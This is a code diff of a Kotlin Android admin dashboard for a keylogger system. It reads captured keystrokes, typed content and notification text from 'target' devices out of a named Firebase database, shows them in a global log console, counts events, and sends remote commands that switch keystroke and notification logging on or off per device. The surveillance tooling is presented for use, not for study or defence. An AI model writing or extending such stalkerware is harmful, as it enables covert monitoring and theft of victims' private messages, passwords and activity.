@@ -24,6 +24,8 @@ class AdminMainActivity : AppCompatActivity() {
 
     private lateinit var recyclerView: RecyclerView
     private lateinit var txtTotalDevices: TextView
+    private lateinit var txtTotalEvents: TextView
+    private lateinit var txtGlobalLogConsole: TextView
     private val deviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
     private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
@@ -31,8 +33,7 @@ class AdminMainActivity : AppCompatActivity() {
     data class DeviceModel(
         val name: String,
         var keylogging: Boolean = true,
-        var notifications: Boolean = true,
-        var logFeed: String = "Waiting for device activity..."
+        var notifications: Boolean = true
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -45,10 +46,13 @@ class AdminMainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_admin_main)
 
         txtTotalDevices = findViewById(R.id.txtTotalDevices)
+        txtTotalEvents = findViewById(R.id.txtTotalEvents)
+        txtGlobalLogConsole = findViewById(R.id.txtGlobalLogConsole)
+
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
         btnRefresh.setOnClickListener {
             loadConnectedDevices()
-            Toast.makeText(this, "Devices synced successfully!", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Dashboard synced successfully!", Toast.LENGTH_SHORT).show()
         }
 
         recyclerView = findViewById(R.id.recyclerViewDevices)
@@ -65,14 +69,16 @@ class AdminMainActivity : AppCompatActivity() {
                 ref.child("status").child("notifications").setValue(newState)
             }
             adapter.notifyDataSetChanged()
+            Toast.makeText(this, "Command sent to ${device.name}", Toast.LENGTH_SHORT).show()
         }
         recyclerView.adapter = adapter
 
         loadConnectedDevices()
+        loadGlobalLogs()
     }
 
     private fun loadConnectedDevices() {
-        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands")
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 for (child in snapshot.children) {
@@ -81,7 +87,24 @@ class AdminMainActivity : AppCompatActivity() {
                         val device = DeviceModel(deviceName)
                         deviceList.add(device)
                         listenToDeviceState(deviceName)
-                        listenToDeviceLogs(deviceName)
+                    }
+                }
+                txtTotalDevices.text = deviceList.size.toString()
+                adapter.notifyDataSetChanged()
+            }
+
+            override fun onCancelled(error: DatabaseError) {}
+        })
+
+        val batchRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        batchRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                for (child in snapshot.children) {
+                    val deviceName = child.key ?: continue
+                    if (deviceList.none { it.name == deviceName }) {
+                        val device = DeviceModel(deviceName)
+                        deviceList.add(device)
+                        listenToDeviceState(deviceName)
                     }
                 }
                 txtTotalDevices.text = deviceList.size.toString()
@@ -132,34 +155,36 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
-    private fun listenToDeviceLogs(deviceName: String) {
-        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
+    private fun loadGlobalLogs() {
+        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val sb = StringBuilder()
                 val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
+                var eventCount = 0
 
-                for (appChild in snapshot.children) {
-                    val appName = appChild.key ?: continue
-                    for (entry in appChild.children) {
-                        val text = entry.child("text").getValue(String::class.java)
-                            ?: entry.child("title").getValue(String::class.java)
-                            ?: entry.child("typedContent").getValue(String::class.java)
-                            ?: continue
+                for (deviceChild in snapshot.children) {
+                    val deviceName = deviceChild.key ?: continue
+                    for (appChild in deviceChild.children) {
+                        val appName = appChild.key ?: continue
+                        for (entry in appChild.children) {
+                            val text = entry.child("text").getValue(String::class.java)
+                                ?: entry.child("title").getValue(String::class.java)
+                                ?: entry.child("typedContent").getValue(String::class.java)
+                                ?: continue
 
-                        val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
-                        val timeStr = timeFormat.format(Date(timestampMillis))
+                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
+                            val timeStr = timeFormat.format(Date(timestampMillis))
 
-                        if (text.isNotBlank() && text != "null") {
-                            sb.append("[$timeStr] [$appName] $text\n")
+                            if (text.isNotBlank() && text != "null") {
+                                eventCount++
+                                sb.append("$timeStr  |  $appName  |  $text\n")
+                            }
                         }
                     }
                 }
-                val index = deviceList.indexOfFirst { it.name == deviceName }
-                if (index != -1) {
-                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No recent activity."
-                    adapter.notifyItemChanged(index)
-                }
+                txtTotalEvents.text = eventCount.toString()
+                txtGlobalLogConsole.text = if (sb.isNotEmpty()) sb.toString() else "No target logs recorded yet."
             }
 
             override fun onCancelled(error: DatabaseError) {}
@@ -175,7 +200,6 @@ class AdminMainActivity : AppCompatActivity() {
             val txtName: TextView = view.findViewById(R.id.txtDeviceName)
             val btnKey: Button = view.findViewById(R.id.btnToggleKeyLog)
             val btnNotif: Button = view.findViewById(R.id.btnToggleNotifLog)
-            val txtLog: TextView = view.findViewById(R.id.txtDeviceLogConsole)
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -202,8 +226,6 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.text = "Notif Logger: OFF"
                 holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
             }
-
-            holder.txtLog.text = device.logFeed
 
             holder.btnKey.setOnClickListener {
                 onToggle(device, "key", !device.keylogging)
